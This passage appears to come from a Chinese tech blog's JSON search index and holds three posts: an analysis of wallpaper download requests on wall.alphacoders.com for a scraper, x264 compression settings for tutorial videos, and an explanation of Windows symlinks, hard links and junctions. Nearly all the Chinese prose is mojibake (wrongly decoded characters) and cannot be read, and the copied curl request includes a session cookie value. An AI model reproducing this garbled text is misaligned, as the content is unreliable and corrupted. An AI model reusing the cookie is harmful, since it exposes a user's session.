·æƒ³æŠŠå®ƒä»¬ç»™ä¸‹è½½åˆ°è‡ªå·±çš„ç”µè„‘ä¸Šå¹»ç¯ç‰‡å½“ä½œå£çº¸äº†ï¼Œå½“ç„¶æ‰‹å·¥ä¸‹è½½æ˜¯ä¸å¯èƒ½çš„ï¼Œå¿…é¡»å†™ä¸‹çˆ¬è™«ï¼Œåˆ†æä¸‹å£çº¸ä¸‹è½½æµç¨‹ã€‚\u003c/p\u003e\n\u003ch2 id=\"è¯·æ±‚åˆ†æ\"\u003eè¯·æ±‚åˆ†æ\u003c/h2\u003e\n\u003cp\u003eé¦–å…ˆæˆ‘ä»¬\u003ccode\u003eF12\u003c/code\u003eæ‰“å¼€å¼€å‘è€…å·¥å…·ï¼Œåœ¨ä¸€å¼ å›¾ä¸Šæ‰¾åˆ°ä¸‹è½½\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1g11dqnaw51j20ac077777.jpg\" alt=\"\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬åœ¨å¼€å‘è€…å·¥å…·é‡Œé¢å–å…ƒç´ ï¼Œå¹¶æ²¡æœ‰çœ‹åˆ°ä¸‹è½½é“¾æ¥ï¼Œè¯´æ˜ä¸‹è½½é“¾æ¥å¹¶æ²¡æœ‰åŒ…å«åœ¨åŸå§‹htmlä¸­ï¼Œä½†æ˜¯ç‚¹å‡»æ˜¯å¯ä»¥ä¸‹è½½çš„ï¼Œå¹¶ä¸”å¯ä»¥çœ‹åˆ°æ•´ä¸ªé¡µé¢å¹¶æ²¡æœ‰è¿›è¡Œåˆ·æ–°ï¼Œåˆ¤æ–­æ˜¯ä¸€ä¸ªajaxè¯·æ±‚ï¼Œç›´æ¥ç‚¹è¿›\u003ccode\u003eXHR\u003c/code\u003eï¼Œç„¶åå†æ¬¡ç‚¹å‡»ä¸‹è½½é“¾æ¥å¯ä»¥çœ‹åˆ°è¯·æ±‚ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1g11dw0idvpj212a0lwn62.jpg\" alt=\"\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eå¯ä»¥çœ‹åˆ°è¿™ä¸ªè¯·æ±‚è¿”å›äº†ä¸€ä¸ªé“¾æ¥ï¼Œæˆ‘ä»¬ç›´æ¥è®¿é—®é“¾æ¥ï¼Œå‘ç°æ˜¯å¯ä»¥ä¸‹è½½çš„ï¼Œè¯´æ˜è¿™å°±æ˜¯ä¸‹è½½é“¾æ¥äº†ï¼Œé‚£ä¹ˆè¿™ä¸ªé“¾æ¥æ˜¯æ€ä¹ˆæ¥çš„å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1g11dy25rizj20o30d5gme.jpg\" alt=\"\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬çœ‹çœ‹è¯·æ±‚ï¼Œè¿™ä¸ªpostè¯·æ±‚é‡Œé¢æœ‰ä¸€äº›å‚æ•°ï¼Œæˆ‘ä»¬å…ˆä¸å»è€ƒè™‘è¿™äº›å‚æ•°æ€ä¹ˆæ¥çš„ï¼Œæˆ‘ä»¬å…ˆæ¨¡æ‹Ÿä¸€ä¸‹è¯·æ±‚çœ‹çœ‹è¯·æ±‚Headeré‡Œé¢æœ‰æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿æ˜¯å¿…é¡»çš„ï¼Œè¿™é‡Œç›´æ¥ä¸Š\u003ccode\u003epostman\u003c/code\u003eæˆ–è€…\u003ccode\u003ecurl\u003c/code\u003eéƒ½å¯ä»¥ï¼Œå¦‚æœä½ çš„æœºå™¨ä¸Šé¢å®‰è£…äº†\u003ccode\u003ecurl\u003c/code\u003eæˆ‘æ¨èç”¨è¿™ä¸ªï¼Œå› ä¸º\u003ccode\u003eChrome\u003c/code\u003eå¼€å‘è€…å·¥å…·ï¼Œç›´æ¥å¯ä»¥åœ¨è¯·æ±‚ä¸Šå³é”®\u003ccode\u003eCopy as cURL\u003c/code\u003eï¼Œç›´æ¥å¯ä»¥å¸®ä½ å¤åˆ¶å‡ºcurlå‘½ä»¤ï¼Œæˆ‘è¿™é‡Œå¤åˆ¶å‡ºæ¥æ˜¯è¿™æ ·çš„\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-gdscript3\" data-lang=\"gdscript3\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;https://wall.alphacoders.com/get_download_link.php\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003eH \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Pragma: no-cache\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003eH \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Origin: https://wall.alphacoders.com\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003eH \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Accept-Encoding: gzip, deflate, br\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003eH \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Accept-Language: zh-CN,zh;q=0.9\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003eH \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003eH \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Content-Type: application/x-www-form-urlencoded; charset=UTF-8\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003eH \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Accept: */*\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003eH \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Cache-Control: no-cache\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003eH \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;X-Requested-With: XMLHttpRequest\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003eH \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Cookie: __cfduid=d7ec945393d1b5ef3c28d4c9d12ef9fb11552315444; cookieconsent_status=allow; wa_session=1eogv8ehgn3itq5g4g8hfsducpkm9lbu46q893vrkhph3ued4rm89gvk7ck4fdg9k73cmrcdesoqj4crm1575vj3lfid9e67fpis661\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003eH \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Connection: keep-alive\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003eH \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Referer: https://wall.alphacoders.com/search.php?search=Asuna\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e--\u003c/span\u003edata \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;wallpaper_id=533007^\u0026amp;type=png^\u0026amp;server=images8^\u0026amp;user_id=79150\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e--\u003c/span\u003ecompressed\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eæˆ‘ä»¬å…ˆå»æ‰ä¸å¿…è¦çš„ä¸œè¥¿ \u003ccode\u003ecurl \u0026quot;https://wall.alphacoders.com/get_download_link.php\u0026quot; --data \u0026quot;wallpaper_id=533007\u0026amp;type=png\u0026amp;server=images8\u0026amp;user_id=79150\u0026quot;\u003c/code\u003e ï¼Œç›´æ¥æ‰§è¡Œï¼Œå‘ç°å¯ä»¥è·å–åˆ°åœ°å€ï¼Œæ‰€ä»¥ç°åœ¨è¦è€ƒè™‘çš„åªæœ‰è¿™äº›å‚æ•°æ˜¯æ€ä¹ˆæ¥çš„äº†ï¼Œä¸‹é¢æˆ‘åŒæ ·æ”¾ä¸€å¼ postmançš„å›¾ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯åŒæ ·çš„å¯ä»¥è·å–åˆ°ä¸‹è½½é“¾æ¥\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1g11e4cniksj20hq04lwek.jpg\" alt=\"\"  /\u003e\n\n\u003cimg loading=\"lazy\" src=\"https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1g11e7mv54sj20tx0cvgm5.jpg\" alt=\"\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eè¿™äº›å‚æ•°æˆ‘ä»¬ä»ä¸¤æ–¹é¢è€ƒè™‘ï¼Œä¸€æ˜¯ç”¨jsç®—å‡ºæ¥çš„ï¼Œä¸€ä¸ªå°±æ˜¯åœ¨htmlä¸­å­˜åœ¨çš„ã€‚\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬é¦–å…ˆåœ¨htmlé‡Œæ‰¾æ‰¾çœ‹æœ‰æ²¡æœ‰ã€‚\u003c/p\u003e\n\u003cp\u003eé€šè¿‡å…³é”®å­—æœç´¢é¡µé¢htmlï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°æ¯ä¸€å¼ å›¾éƒ½æœ‰ä¸€ä¸²ç±»ä¼¼äºä¸‹é¢çš„å±æ€§\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-fallback\" data-lang=\"fallback\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata-id=\u0026#34;533007\u0026#34; data-type=\u0026#34;png\u0026#34; data-server=\u0026#34;images8\u0026#34; data-user-id=\u0026#34;79150\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eå’Œä¸Šé¢çš„postå‚æ•°æ˜¯ä¸€ä¸€å¯¹åº”çš„ã€‚\u003c/p\u003e","title":"æ‰“é€ ä¸€ä¸ªå£çº¸çˆ¬è™«æ¥çˆ¬ä½ çš„è€å©†"},{"content":"å½•åˆ¶å®Œäº†æ•™ç¨‹è§†é¢‘ï¼Œå¦‚ä½•å‹åˆ¶ä¼šåœ¨ä¸å½±å“è§‚çœ‹çš„æƒ…å†µä¸‹ï¼Œä½¿å¾—åˆ°çš„è§†é¢‘ä½“ç§¯è¾ƒå°å‘¢ï¼Ÿ\nä»¥ä¸‹æ˜¯ä½¿ç”¨x264è¿›è¡Œå‹åˆ¶ï¼Œå¦‚æœæ˜¯ä½¿ç”¨å°ä¸¸å·¥å…·ç®±è¯·è‡ªå®šä¹‰å‘½ä»¤\n1 --crf 28 --level 4.1 --ref 3 --bframes 13 --keyint 600 --qcomp 0.8 --b-adapt 1 --scenecut 30 --me umh --merange 32 --subme 10 --trellis 2 --aq-mode 3 --aq-strength 1.0 --psy-rd 0.6:0.0 --direct auto --partitions all éŸ³é¢‘å»ºè®®å‹åˆ¶ä¸º32Kbpsæˆ–ä»¥ä¸‹ï¼Œæ•™ç¨‹ä¸éœ€è¦å¤ªå¥½çš„éŸ³è´¨ã€‚\n","permalink":"https://www.hacktech.cn/post/how-to-compress-video-smaller-size.html","summary":"\u003cp\u003eå½•åˆ¶å®Œäº†æ•™ç¨‹è§†é¢‘ï¼Œå¦‚ä½•å‹åˆ¶ä¼šåœ¨ä¸å½±å“è§‚çœ‹çš„æƒ…å†µä¸‹ï¼Œä½¿å¾—åˆ°çš„è§†é¢‘ä½“ç§¯è¾ƒå°å‘¢ï¼Ÿ\u003c/p\u003e","title":"æ•™ç¨‹è§†é¢‘å¦‚ä½•å‹åˆ¶ä½“ç§¯æ›´å°"},{"content":"å­¦æ ¡å˜›ï¼Œæœ‰äº›æ—¶å€™è¿˜æ˜¯å¾—é€†é€†ä¸Šç½‘å®¢æˆ·ç«¯å•¥çš„ï¼Œå¹¶ä¸”å­¦æ ¡çš„ä¸å°‘å·¥ä½œï¼Œè¿™Windowsçš„éœ€æ±‚è¿˜æ˜¯æŒºå¼ºçš„ï¼Œä¹‹å‰Win10çš„ä½“éªŒå¹¶ä¸æ˜¯å¤ªå¥½ï¼Œä¸è¿‡æ—¶éš”è¿™ä¹ˆä¹…ï¼Œæ‰“ç®—ä»7å‡çº§åˆ°10äº†ï¼Œæ°å¥½ç³»ç»Ÿä¹Ÿè¯¥æ¢äº†ã€‚\né¦–å…ˆæ˜¯å‘½ä»¤è¡Œçš„å…³æ³¨ï¼Œåœ¨å®¶é‡Œä½¿ç”¨äº†å¤ªä¹…çš„marjaroï¼Œé€æ¸è½¬ä¸ºå¼€å‘ï¼Œä»¥å‰å¯¹windowsçš„å‘½ä»¤è¡Œä¸å…³æ³¨ä¹Ÿå˜ä¸ºå…³æ³¨äº†ï¼ŒPowerShellå®‰è£…äº†scoopï¼Œå¯ä»¥ä¸€é”®å®‰è£…ä¸å°‘å·¥å…·äº†ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªç—›ç‚¹å°±æ˜¯ï¼Œä»¥å‰å¯¹ç”¨æˆ·ç›®å½•ä¸å…³æ³¨ï¼Œä½†æ˜¯linuxç”¨ä¹…äº†åè€Œè§‰å¾—ç”¨æˆ·ç›®å½•å¥½ç”¨æŒ–ï¼Œæˆ‘æƒ³åœ¨åœ¨å‘½ä»¤è¡Œä¸‹åˆ‡åˆ°æˆ‘å¿«æ·æ–¹å¼æŒ‡å‘çš„ç›®å½•ï¼Œä½†æ˜¯æ˜¯ä¸è¡Œçš„ï¼Œç„¶åäº†è§£äº†ä¸€ä¸‹è¿™æ–¹é¢ï¼Œå°±åƒæ˜¯linuxä¸‹çš„è½¯é“¾æ¥ç¡¬é“¾æ¥ä¸€æ ·ã€‚\nä½¿ç”¨PowerShell è½¯é“¾æ¥ 1 New-Item -ItemType SymbolicLink -Path C:\\\\image -Target C:\\\\source.txt ç¡¬é“¾æ¥ 1 New-Item -ItemType HardLink -Path C:\\\\image.txt -Target C:\\\\source.txt Junction windowsä¸­æ–‡ä»¶ä¸æ–‡ä»¶å¤¹æ˜¯å®Œå…¨ä¸åŒçš„ä¸¤ç§ç±»å‹ï¼Œåˆ›å»ºæ–‡ä»¶å¤¹é“¾æ¥ä¸å¯ä»¥ä½¿ç”¨ HardLink ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨ Junction\n1 New-Item -ItemType Junction -Path C:\\\\test\\_image -Target C:\\\\test\\_source è™½ç„¶powershellå¯ä»¥å»ºç«‹ï¼Œä½†æ˜¯å‘½ä»¤è¿˜æ˜¯å¾ˆç¹çï¼Œcmdä¸‹æœ‰ä¸ªå·¥å…·mklink\nä½¿ç”¨CMD cmdä¸‹æœ‰ä¸ªå¥½ç”¨çš„å·¥å…·mklink\n1 2 3 4 5 6 7 8 9 C:\\\\\u0026gt;mklink åˆ›å»ºç¬¦å·é“¾æ¥ã€‚ MKLINK \\[\\[/D\\] | \\[/H\\] |\\[/J\\]\\] Link Target /D åˆ›å»ºç›®å½•ç¬¦å·é“¾æ¥ã€‚é»˜è®¤ä¸ºæ–‡ä»¶ç¬¦å·é“¾æ¥ã€‚ /H åˆ›å»ºç¡¬é“¾æ¥è€Œéç¬¦å·é“¾æ¥ã€‚ /J åˆ›å»ºç›®å½•é“¾æ¥ã€‚ Link æŒ‡å®šæ–°çš„ç¬¦å·é“¾æ¥åç§°ã€‚ Target æŒ‡å®šæ–°é“¾æ¥å¼•ç”¨çš„è·¯å¾„ï¼ˆç»å¯¹æˆ–ç›¸å¯¹ï¼‰ã€‚ è½¯é“¾æ¥å’Œç¡¬é“¾æ¥çš„åŒºåˆ« å…¶å®è¿™éƒ¨åˆ†å’Œlinuxä¸­çš„æ˜¯å·®ä¸å¤šçš„\nç¬¦å·(è½¯)é“¾æ¥ï¼ˆSymbolic linkï¼‰\næ‰§è¡Œå‘½ä»¤ mklink link_name target_name åˆ›å»ºé“¾æ¥åçš„å›¾æ ‡å’Œå¿«æ·æ–¹å¼å¾ˆåƒ åœ¨ç³»ç»Ÿä¸­ä¸å ç”¨ç©ºé—´ åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­ä¸æ˜¯ä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶ åœ¨æ“ä½œç³»ç»Ÿå±‚è§£æï¼ˆï¼ï¼Ÿï¼‰ å¦‚æœæºæ–‡ä»¶è¢«åˆ é™¤äº†ï¼Œé“¾æ¥å°±æ²¡ç”¨äº† ç§»é™¤æºæ–‡ä»¶ä¸ä¼šå½±å“ç¬¦å·é“¾æ¥ ç§»é™¤é“¾æ¥æ–‡ä»¶ä¹Ÿä¸ä¼šå½±å“æºæ–‡ä»¶ ç¡¬é“¾æ¥ï¼ˆHard linkï¼‰\næ‰§è¡Œå‘½ä»¤ mklink /H link_name target_name åœ¨ç³»ç»Ÿä¸­å ç”¨çš„ç©ºé—´ä¸æºæ–‡ä»¶ç›¸åŒï¼Œä½†åœ¨ç³»ç»Ÿä¸­å¼•ç”¨çš„æ˜¯ç›¸åŒçš„å¯¹è±¡ï¼ˆä¸æ˜¯æ‹·è´ï¼‰ åœ¨æ“ä½œç³»ç»Ÿå±‚è§£æï¼ˆï¼ï¼Ÿï¼‰ å›¾æ ‡å’Œåˆ›å»ºå¿«æ·æ–¹å¼çš„å›¾æ ‡ä¸åŒ ç§»é™¤æºæ–‡ä»¶ä¸ä¼šå½±å“ç¡¬é“¾æ¥ ç§»é™¤ç¡¬é“¾æ¥ä¸ä¼šå½±å“æºæ–‡ä»¶ å¦‚æœæºæ–‡ä»¶è¢«åˆ é™¤ï¼Œå®ƒçš„å†…å®¹ä¾ç„¶é€šè¿‡ç¡¬é“¾æ¥å­˜åœ¨ ç¡¬é“¾æ¥æ–‡ä»¶çš„ä»»ä½•æ›´æ”¹éƒ½ä¼šå½±å“åˆ°æºæ–‡ä»¶ å¿«æ·æ–¹å¼æœ‰ä½•ä¸åŒ é¦–å…ˆä¸è¯´å¿«æ·æ–¹å¼å ç©ºé—´ï¼Œ è½¯é“¾æ¥ä¸å ç©ºé—´ï¼Œè¿˜æœ‰æˆ‘è§‰å¾—å¾ˆé‡è¦çš„åŒºåˆ«æ˜¯å¿«æ·æ–¹å¼å¸¦åç¼€.lnkï¼Œæ˜¯ä¸ªæ–‡ä»¶ï¼Œæ— æ³•é€šè¿‡è·¯å¾„é‡å®šå‘åˆ°ç›®æ ‡åœ°å€ï¼Œåæ­£æˆ‘ä¸å¤ªæ¨èè¿™ä¸ªï¼Œé™¤éæ˜¯å»ºç«‹åˆ°æ¡Œé¢æ–¹ä¾¿é¼ æ ‡ç‚¹å‡»çš„ç”¨æˆ·ã€‚\nè½¯é“¾æ¥å’ŒJunctionçš„åŒºåˆ« å¯èƒ½ä½ ä¼šç–‘æƒ‘ mklink å‘½ä»¤å‚æ•° /D å’Œ /J çš„åŒºåˆ«ã€‚è¿™é‡Œæˆ‘ç›´æ¥è´´ä¸€æ®µæˆ‘æŸ¥åˆ°çš„ä¸œè¥¿ï¼š\nåˆ›å»º /d å¯ä»¥ä½¿ç”¨ç›¸å¯¹è·¯å¾„æ–¹å¼åˆ›å»º /j å¿…é¡»ç»å¯¹è·¯å¾„æ–¹å¼åˆ›å»º æ­¤åŒºåˆ«æ„ä¹‰ä¸å¤§ï¼Œå»ºè®®æ‰€æœ‰çš„mklinkç›®å½•å‡ç”¨ç»å¯¹è·¯å¾„åˆ›å»º å¤åˆ¶å’Œå‰ªåˆ‡ å¤åˆ¶ï¼š/d /j å‡ç”Ÿæˆæºç›®å½•çš„å†…å®¹å‰¯æœ¬ï¼Œå˜ä¸ºä¸€èˆ¬æ–‡ä»¶å¤¹ å‰ªåˆ‡/ç§»åŠ¨ï¼š/d ç”Ÿæˆçš„ç›®å½•ï¼Œç§»åŠ¨åˆ°å…¶ä»–åœ°æ–¹ï¼Œä»æ—§ä¿æŒé“¾æ¥ã€‚å¯¹æºç›®å½•æ— å½±å“ï¼Œ/dç”Ÿæˆçš„ç›®å½•æ¶ˆå¤± /j ç”Ÿæˆçš„ç›®å½•ï¼Œç§»åŠ¨åˆ°å…¶ä»–åœ°æ–¹ï¼Œä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„å‰¯æœ¬æ–‡ä»¶å¤¹ï¼Œæºæ–‡ä»¶å¤¹å†…å®¹å…¨éƒ¨ç§»è‡³æ–°æ™®é€šæ–‡ä»¶å¤¹å†…ï¼Œæºæ–‡ä»¶å¤¹æ¸…ç©ºï¼Œæºæ–‡ä»¶å¤¹ä»æ—§å­˜åœ¨ï¼Œ/jç”Ÿæˆçš„ç›®å½•ä¹Ÿä¾æ—§å­˜åœ¨ è½¯ä»¶æ‰“å¼€ ç”¨filedialogæ‰“å¼€ï¼Œ/dç”Ÿæˆçš„ç›®å½•ï¼Œåœ°å€æ ä¼šè·³åˆ°æºç›®å½•ä½ç½®ã€‚ /Jç”Ÿæˆçš„ç›®å½•ï¼Œåœ°å€æ ä¸ä¼šè·³åˆ°æºç›®å½•ä½ç½®ã€‚ ç”¨FolderDialogæ‰“å¼€ï¼Œä¸¤è€…ç›¸åŒã€‚ æ•´ä½“æ¥è¯´ï¼Œ/Dæ›´åƒä¸€ä¸ªå¿«æ·æ–¹å¼ã€‚\nç¬¦å·é“¾æ¥ï¼ˆSymlinkï¼ŒSoftlinkï¼‰æ˜¯å¯¹æ–‡ä»¶æˆ–ç›®å½•çš„å¼•ç”¨ï¼Œå®é™…ä¸Šç¬¦å·é“¾æ¥æœ¬èº«æ˜¯ä¸€ä¸ªâ€œè®°å½•ç€æ‰€å¼•ç”¨æ–‡ä»¶æˆ–ç›®å½•çš„ç»å¯¹æˆ–ç›¸å¯¹è·¯å¾„â€çš„ç‰¹æ®Šæ–‡ä»¶ï¼Œé€šè¿‡ç¬¦å·é“¾æ¥çš„æ“ä½œéƒ½ä¼šè¢«é‡å®šå‘åˆ°ç›®æ ‡æ–‡ä»¶æˆ–ç›®å½•ã€‚\näº¤æ¥ç‚¹ï¼ˆJunctionï¼‰ï¼Œä¹Ÿç§°ä¸ºâ€œå†åˆ†æç‚¹â€ï¼Œæ˜¯ NTFS 3.0 åŠä»¥ä¸Šæ–‡ä»¶ç³»ç»Ÿï¼ˆWindows 2000 åŠä»¥ä¸Šç³»ç»Ÿï¼‰çš„ç‰¹æ€§ï¼Œå®ƒæ˜¯é“¾æ¥æœ¬åœ°ç›®å½•ï¼ˆå¯è·¨å·ï¼‰çš„è®¿é—®ç‚¹ï¼Œé€šè¿‡äº¤æ¥ç‚¹çš„æ“ä½œéƒ½ä¼šè¢«ç³»ç»Ÿæ˜ å°„åˆ°å®é™…çš„ç›®å½•ä¸Šã€‚é€šè¿‡å»ºç«‹äº¤æ¥ç‚¹ï¼Œå¯ä»¥åœ¨ä¿è¯ä¸€ä¸ªç›®å½•å®ä¾‹ï¼ˆç›®å½•çš„ä¸€è‡´æ€§ï¼‰çš„å‰æä¸‹ï¼Œå…è®¸ç”¨æˆ·æˆ–ç¨‹åºä»æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­çš„å¤šä¸ªä½ç½®è®¿é—®æ­¤ç›®å½•ã€‚ å¯¹ç¬¦å·é“¾æ¥å’Œå¿«æ·æ–¹å¼çš„â€œè¯»ã€å†™ã€éå†â€ç­‰æ“ä½œéƒ½ä¼šè¢«é‡å®šå‘åˆ°ç›®æ ‡æ–‡ä»¶æˆ–ç›®å½•ï¼›ä½†å¯¹å®ƒä»¬çš„â€œå¤åˆ¶ã€åˆ é™¤ã€ç§»åŠ¨ã€é…ç½® ACLâ€ç­‰æ“ä½œåªé’ˆå¯¹è‡ªèº«ï¼›ç¬¦å·é“¾æ¥ä¸ä½†å¯ä»¥åº”ç”¨äºæœ¬åœ°ç³»ç»Ÿï¼Œè¿˜å¯ä»¥åº”ç”¨ UNC è·¯å¾„ã€‚\nå¯¹äº¤æ¥ç‚¹å†…æ–‡ä»¶å’Œå­ç›®å½•çš„â€œå»ºç«‹ã€åˆ é™¤ã€ä¿®æ”¹â€ç­‰æ“ä½œéƒ½è¢«æ˜ å°„åˆ°å¯¹åº”çš„ç›®å½•ä¸­çš„æ–‡ä»¶å’Œå­ç›®å½•ä¸Šï¼›\nå¯¹äº¤æ¥ç‚¹çš„â€œå¤åˆ¶ã€ç²˜è´´ã€å‰ªåˆ‡ã€é…ç½® ACLâ€ï¼Œåªä¼šå½±å“æ­¤äº¤æ¥ç‚¹ï¼›\nåœ¨åŒä¸€å·å†…ç§»åŠ¨äº¤æ¥ç‚¹ï¼Œåªä¼šå½±å“æ­¤äº¤æ¥ç‚¹ï¼›ä½†åœ¨ä¸åŒå·é—´ç§»åŠ¨äº¤æ¥ç‚¹ï¼Œä¼šå°†æ­¤äº¤æ¥ç‚¹è½¬æ¢ä¸ºæ­£å¸¸ç›®å½•ï¼Œå¹¶ä¸”äº¤æ¥ç‚¹å¯¹åº”ç›®å½•ä¸‹çš„æ‰€æœ‰å†…å®¹éƒ½ä¼šè¢«ç§»åŠ¨ï¼›\né€šè¿‡â€œèµ„æºæµè§ˆå™¨ï¼ˆExplorer.exeï¼‰â€å’Œâ€œå‘½ä»¤è¡Œ delâ€ç­‰å·¥å…·åˆ é™¤äº¤æ¥ç‚¹æ—¶ï¼Œä¼šåŒæ—¶åˆ é™¤å¯¹åº”ç›®å½•ä¸‹çš„æ‰€æœ‰å†…å®¹ï¼ˆä½†ä¸ä¼šåˆ é™¤ç›®å½•ï¼‰ï¼›å¯é€šè¿‡â€œlinkd.exe /dâ€å®‰å…¨çš„åˆ é™¤äº¤æ¥ç‚¹ï¼›ä½†åœ¨ vista åŠä»¥åçš„ç³»ç»Ÿä¸­ï¼Œå¯¹äº¤æ¥ç‚¹çš„åˆ é™¤ä¼šè¢«æ­£ç¡®çš„å¤„ç†ã€‚\nä½ å¯ä»¥è‡ªå·±å»ºç«‹è¿™ä¸¤ä¸ªåï¼Œåœ¨åŒå·å’Œåœ¨ä¸åŒå·é—´å¤åˆ¶ç§»åŠ¨ç²˜è´´çœ‹çœ‹åŒºåˆ«ï¼Œå°±æš‚æ—¶æˆ‘äº†è§£åˆ°çš„æ¥è¯´çš„è¯ï¼Œæˆ‘ä¸ªäººå»ºè®®æ˜¯ä½¿ç”¨/Dã€‚\n","permalink":"https://www.hacktech.cn/post/windows-file-dir-link.html","summary":"\u003cp\u003eå­¦æ ¡å˜›ï¼Œæœ‰äº›æ—¶å€™è¿˜æ˜¯å¾—é€†é€†ä¸Šç½‘å®¢æˆ·ç«¯å•¥çš„ï¼Œå¹¶ä¸”å­¦æ 